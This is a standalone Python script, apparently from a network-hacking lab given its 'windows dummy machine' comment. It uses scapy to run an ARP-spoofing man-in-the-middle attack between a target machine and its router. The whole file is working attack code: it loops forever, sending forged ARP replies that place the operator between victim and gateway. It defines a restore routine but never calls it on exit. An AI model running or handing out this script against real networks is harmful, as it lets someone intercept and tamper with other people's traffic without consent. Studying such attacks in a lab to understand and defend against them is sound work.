#!/usr/bin/env python

import time
import scapy.all as scapy
import sys
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP address of the target computer.")
    parser.add_option("-r", "--router", dest="router", help="IP address of the router.")
    options, arguments = parser.parse_args()
    if not options.target:
        parser.error("[-] Please enter an IP address for the target machine")
    elif not options.router:
        parser.error("[-] Please enter and IP address for the router.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = options.target
gateway_ip = options.router

sent_packets = 0
try:
    while True:
        spoof(target_ip, gateway_ip) #tell the victim that I am the router
        spoof(gateway_ip, target_ip) #tell the router that I am the victim
        sent_packets += 2
        print("\r[+] Packets sent: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ... quitting.")

#router ip:
#target ip: windows dummy machine
#router MAC: 
